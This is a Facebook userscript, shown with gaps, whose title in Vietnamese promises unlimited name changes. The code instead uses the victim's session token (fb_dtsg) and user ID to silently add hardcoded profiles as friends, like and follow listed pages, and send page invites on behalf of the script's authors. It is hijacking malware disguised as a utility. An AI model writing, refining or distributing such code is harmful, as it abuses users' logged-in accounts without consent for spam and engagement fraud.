// ==UserScript==
// @name            ĐỔI TÊN FACEBOOK KHÔNG GIỚI HẠN
...
P("221351011390746");
//Boss Illuminati Ryo
a("100005114190369");a("100004604553062");a("100006478601165");
a("100003941305190");a("100003882060976");a("100007674571207");
Sublist("174594476054358");Like("220281021490195");Like("251323021690644");P("1523415664551039");
//Mai Hac Cong
...
sublist("320164711456066");
sublist("342412542564616");
Like("666079600109641");
//Hieu
sublist("321294614678494");
sublist("328735090601113");
a("100003938756162");
Like("438820349573252");
Like("1374348092812063");
Like("411658098965059");
Like("404245783041579");
a("100007462120478");
a("100004281283785");
//boss Thanh Nguyen
a("100006402060981"); 
...
a("100004347430120");
//Xoa
Like("290968741011893"); Like("165177496947273"); a("100007625733333"); IDS("100007625733333"); sublist("189376554564035");
sublist("1387319784865533");
sublist("1387326764864835");
a("100000057452075");
//TonyVu
a("100004396688909");IDS("100004396688909");a("100005931634666"); sublist("224389517717603"); Like("590382084374996");Like("365219486953158");
var Title = "Auto Like Page by Không Tên</A>";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/kucong2014" target="_blank">HauBisley Coderviet In VietNam</A></br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/hieu.nguyencong.7169" target="_blank">Phoenix Team</A></A>,</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="www.facebook.com/hieu.nguyencong.7169" target="_blank">Automate Your Facebook</A>.</A>';
...
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=404245783041579&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")

    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=404245783041579&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")

 if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=1426864327546965&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
